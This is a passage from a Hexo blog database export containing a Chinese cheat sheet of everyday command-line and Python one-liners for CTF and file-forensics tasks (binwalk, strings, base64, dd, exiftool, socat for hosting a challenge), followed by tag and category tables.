批量计算文件夹中所有文件md5值\n\n    > md5sum *\n\n12. LSB检查\n\n    > ```python\n    > >>> import Image\n    > >>> a=Image.open('zxczxc.png')\n    > >>> a.point(lambda i: 255 if i&1 else 0).show()\n    > ```\n\n13. 查看文件夹下边的某个字符串\n\n> grep -rn -A10 -B5 \"php_string_shuffle\" ./\n>\n> grep -rn -A10 -B5 \"php_string_shuffle\" -l ./          只列出文件名\n\n14. 监控目录变化\n\n    > watch -n2 ls -l /proc/11631/fd/\n\n15. dd命令使用\n\n    >  dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1\n\n16. shell文件去重\n\n    > sort filename | uniq\n\n17. socat启动一道pwn题目\n\n    > socat tcp-l:8080,fork exec:./note,reuseaddr\n\n18. exiftool使用\n\n    >exiftool [picture_name]\n    >\n    >exiftool -Exif:ImageDescription=\"%^&*()[]{}\" [picture_name]","slug":"简单的一句话","published":1,"updated":"2018-08-04T04:53:53.685Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12j10026qkdl70s1jed6","content":"<ol>\n<li><p>统计文件中每个字符串的长度</p>\n<blockquote>\n<p>grep -o . file.txt | sort | uniq -c | sort -rn</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转化为ascii码</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转为2进制字符串</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python二进制字符串转16进制字符串</p>\n<blockquote>\n<p>str = “0100010101101110”</p>\n<p>‘’.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])</p>\n</blockquote>\n</li>\n<li><p>hexdump使用</p>\n<blockquote>\n<p>hexdump [filename]  以16进制查看文件</p>\n<p>hexdumlp -C [filename] 以16进制查看文件同时显示ascii码</p>\n</blockquote>\n</li>\n<li><p>7z使用</p>\n<blockquote>\n<p>7z x [压缩包]</p>\n</blockquote>\n</li>\n<li><p>binwalk使用</p>\n<blockquote>\n<p>binwalk [filename] 查看文件信息</p>\n<p>binwalk -e [filename]  提取文件</p>\n</blockquote>\n</li>\n<li><p>strings使用</p>\n<blockquote>\n<p>strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串</p>\n</blockquote>\n</li>\n<li><p>base64使用</p>\n<blockquote>\n<p>echo [base64字符串] | base64 -d              base64解密</p>\n<p>echo [字符串] | base64                              base64加密</p>\n</blockquote>\n</li>\n<li><p>debin,ubuntu删除所有带 rc 标记的dpkg包</p>\n<blockquote>\n<p>dpkg -l | grep ^rc | cut -d’ ‘ -f3 | sudo xargs dpkg –purge</p>\n</blockquote>\n</li>\n<li><p>批量计算文件夹中所有文件md5值</p>\n<blockquote>\n<p>md5sum *</p>\n</blockquote>\n</li>\n<li><p>LSB检查</p>\n<blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; &gt;&gt;&gt; <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">&gt; &gt;&gt;&gt; a=Image.open(<span class=\"string\">'zxczxc.png'</span>)</span><br><span class=\"line\">&gt; &gt;&gt;&gt; a.point(<span class=\"keyword\">lambda</span> i: <span class=\"number\">255</span> <span class=\"keyword\">if</span> i&amp;<span class=\"number\">1</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span>).show()</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p>查看文件夹下边的某个字符串</p>\n</li>\n</ol>\n<blockquote>\n<p>grep -rn -A10 -B5 “php_string_shuffle” ./</p>\n<p>grep -rn -A10 -B5 “php_string_shuffle” -l ./          只列出文件名</p>\n</blockquote>\n<ol start=\"14\">\n<li><p>监控目录变化</p>\n<blockquote>\n<p>watch -n2 ls -l /proc/11631/fd/</p>\n</blockquote>\n</li>\n<li><p>dd命令使用</p>\n<blockquote>\n<p> dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</p>\n</blockquote>\n</li>\n<li><p>shell文件去重</p>\n<blockquote>\n<p>sort filename | uniq</p>\n</blockquote>\n</li>\n<li><p>socat启动一道pwn题目</p>\n<blockquote>\n<p>socat tcp-l:8080,fork exec:./note,reuseaddr</p>\n</blockquote>\n</li>\n<li><p>exiftool使用</p>\n<blockquote>\n<p>exiftool [picture_name]</p>\n<p>exiftool -Exif:ImageDescription=”%^&amp;*()[]{}” [picture_name]</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>统计文件中每个字符串的长度</p>\n<blockquote>\n<p>grep -o . file.txt | sort | uniq -c | sort -rn</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转化为ascii码</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转为2进制字符串</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python二进制字符串转16进制字符串</p>\n<blockquote>\n<p>str = “0100010101101110”</p>\n<p>‘’.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])</p>\n</blockquote>\n</li>\n<li><p>hexdump使用</p>\n<blockquote>\n<p>hexdump [filename]  以16进制查看文件</p>\n<p>hexdumlp -C [filename] 以16进制查看文件同时显示ascii码</p>\n</blockquote>\n</li>\n<li><p>7z使用</p>\n<blockquote>\n<p>7z x [压缩包]</p>\n</blockquote>\n</li>\n<li><p>binwalk使用</p>\n<blockquote>\n<p>binwalk [filename] 查看文件信息</p>\n<p>binwalk -e [filename]  提取文件</p>\n</blockquote>\n</li>\n<li><p>strings使用</p>\n<blockquote>\n<p>strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串</p>\n</blockquote>\n</li>\n<li><p>base64使用</p>\n<blockquote>\n<p>echo [base64字符串] | base64 -d              base64解密</p>\n<p>echo [字符串] | base64                              base64加密</p>\n</blockquote>\n</li>\n<li><p>debin,ubuntu删除所有带 rc 标记的dpkg包</p>\n<blockquote>\n<p>dpkg -l | grep ^rc | cut -d’ ‘ -f3 | sudo xargs dpkg –purge</p>\n</blockquote>\n</li>\n<li><p>批量计算文件夹中所有文件md5值</p>\n<blockquote>\n<p>md5sum *</p>\n</blockquote>\n</li>\n<li><p>LSB检查</p>\n<blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; &gt;&gt;&gt; <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">&gt; &gt;&gt;&gt; a=Image.open(<span class=\"string\">'zxczxc.png'</span>)</span><br><span class=\"line\">&gt; &gt;&gt;&gt; a.point(<span class=\"keyword\">lambda</span> i: <span class=\"number\">255</span> <span class=\"keyword\">if</span> i&amp;<span class=\"number\">1</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span>).show()</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p>查看文件夹下边的某个字符串</p>\n</li>\n</ol>\n<blockquote>\n<p>grep -rn -A10 -B5 “php_string_shuffle” ./</p>\n<p>grep -rn -A10 -B5 “php_string_shuffle” -l ./          只列出文件名</p>\n</blockquote>\n<ol start=\"14\">\n<li><p>监控目录变化</p>\n<blockquote>\n<p>watch -n2 ls -l /proc/11631/fd/</p>\n</blockquote>\n</li>\n<li><p>dd命令使用</p>\n<blockquote>\n<p> dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</p>\n</blockquote>\n</li>\n<li><p>shell文件去重</p>\n<blockquote>\n<p>sort filename | uniq</p>\n</blockquote>\n</li>\n<li><p>socat启动一道pwn题目</p>\n<blockquote>\n<p>socat tcp-l:8080,fork exec:./note,reuseaddr</p>\n</blockquote>\n</li>\n<li><p>exiftool使用</p>\n<blockquote>\n<p>exiftool [picture_name]</p>\n<p>exiftool -Exif:ImageDescription=”%^&amp;*()[]{}” [picture_name]</p>\n</blockquote>\n</li>\n</ol>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cjkia12id001kqkdlmj2b68wb","category_id":"cjkia12ii001nqkdlpkq8ls67","_id":"cjkia12j00025qkdlj0do9xnw"},{"post_id":"cjkia12id001kqkdlmj2b68wb","category_id":"cjkia12is001wqkdlf27gk6ed","_id":"cjkia12j30028qkdl4cfuf51k"}],"PostTag":[{"post_id":"cjkia12g30000qkdlxpcijkmr","tag_id":"cjkia12gf0002qkdl6vphklt0","_id":"cjkia12gs0007qkdlaesynr1s"},{"post_id":"cjkia12ga0001qkdlepvt8neg","tag_id":"cjkia12gs0006qkdlkjhnpwxw","_id":"cjkia12gz000cqkdlsm7b69dz"},{"post_id":"cjkia12gx000bqkdl7mffgbm7","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12h3000fqkdl2v4isgb6"},{"post_id":"cjkia12gi0003qkdlmvzhes3z","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12h6000hqkdlpxn03pzm"},{"post_id":"cjkia12h0000dqkdlexmzganc","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12ha000kqkdl2c7hzi2v"},{"post_id":"cjkia12h4000gqkdlfq6qpo7c","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12hc000mqkdlzvx55kmp"},{"post_id":"cjkia12gl0004qkdl032rmg7v","tag_id":"cjkia12gs0006qkdlkjhnpwxw","_id":"cjkia12hg000oqkdlu2q7iuu8"},{"post_id":"cjkia12h7000iqkdlduxnlc4q","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12hj000rqkdlptfo3bsx"},{"post_id":"cjkia12ha000lqkdl6ozynns7","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12hl000tqkdl9zxyva6c"},{"post_id":"cjkia12gs0008qkdlbpulmglf","tag_id":"cjkia12h9000jqkdl4vq9dzh3","_id":"cjkia12hn000wqkdlth2y8qkq"},{"post_id":"cjkia12gv0009qkdljibanjtf","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12hq000yqkdlpq2t2sbh"},{"post_id":"cjkia12hd000nqkdlzcqs0s46","tag_id":"cjkia12hl000uqkdlplabbq3a","_id":"cjkia12ht0011qkdl5vlf27t6"},{"post_id":"cjkia12hj000sqkdlh9wu7ya6","tag_id":"cjkia12hs0010qkdlu9bx813h","_id":"cjkia12hy0016qkdlxiwzkv2e"},{"post_id":"cjkia12hv0013qkdlthukp1u6","tag_id":"cjkia12gs0006qkdlkjhnpwxw","_id":"cjkia12i00018qkdlsh8t8b16"},{"post_id":"cjkia12hn000xqkdl490mnme5","tag_id":"cjkia12hs0010qkdlu9bx813h","_id":"cjkia12i2001bqkdlu0uz2h3a"},{"post_id":"cjkia12i1001aqkdltjsi71ay","tag_id":"cjkia12gs0006qkdlkjhnpwxw","_id":"cjkia12i5001dqkdlsxd3ucw1"},{"post_id":"cjkia12i3001cqkdl50w3zrke","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12i7001fqkdlrg8whi1d"},{"post_id":"cjkia12hx0015qkdlkvxn91kk","tag_id":"cjkia12i10019qkdl516by67c","_id":"cjkia12i9001hqkdlhlqoorxw"},{"post_id":"cjkia12i5001eqkdlc26du460","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12ic001jqkdlzsevsqx6"},{"post_id":"cjkia12i7001gqkdl6yhw6egd","tag_id":"cjkia12gf0002qkdl6vphklt0","_id":"cjkia12ie001lqkdl63zd9ux0"},{"post_id":"cjkia12ie001mqkdlohw425so","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12il001qqkdl45bxg7la"},{"post_id":"cjkia12il001rqkdlsr418jqk","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12ir001uqkdlvtnhmyig"},{"post_id":"cjkia12id001kqkdlmj2b68wb","tag_id":"cjkia12ij001oqkdluj5zzyib","_id":"cjkia12iw0020qkdl6dqzc2b8"},{"post_id":"cjkia12id001kqkdlmj2b68wb","tag_id":"cjkia12iq001tqkdl4wtvyjjq","_id":"cjkia12iy0022qkdl7yefnsya"},{"post_id":"cjkia12it001xqkdlmfdeh59b","tag_id":"cjkia12gw000aqkdlnmic3h51","_id":"cjkia12j00024qkdl22d17exp"},{"post_id":"cjkia12ir001vqkdl3lv8yokq","tag_id":"cjkia12iv001yqkdli4ydv2pp","_id":"cjkia12j30027qkdle9obtsz5"},{"post_id":"cjkia12iy0023qkdlcyncg2e9","tag_id":"cjkia12hs0010qkdlu9bx813h","_id":"cjkia12j30029qkdli7jub033"}],"Tag":[{"name":"web安全","_id":"cjkia12gf0002qkdl6vphklt0"},{"name":"pwn","_id":"cjkia12gs0006qkdlkjhnpwxw"},{"name":"ctf","_id":"cjkia12gw000aqkdlnmic3h51"},{"name":"工具手册","_id":"cjkia12h9000jqkdl4vq9dzh3"},{"name":"mysql","_id":"cjkia12hl000uqkdlplabbq3a"},{"name":"web","_id":"cjkia12hs0010qkdlu9bx813h"},{"name":"python","_id":"cjkia12i10019qkdl516by67c"},{"name":"安全","_id":"cjkia12ij001oqkdluj5zzyib"},{"name":"sql注入","_id":"cjkia12iq001tqkdl4wtvyjjq"},{"name":"前端","_id":"cjkia12iv001yqkdli4ydv2pp"}]}}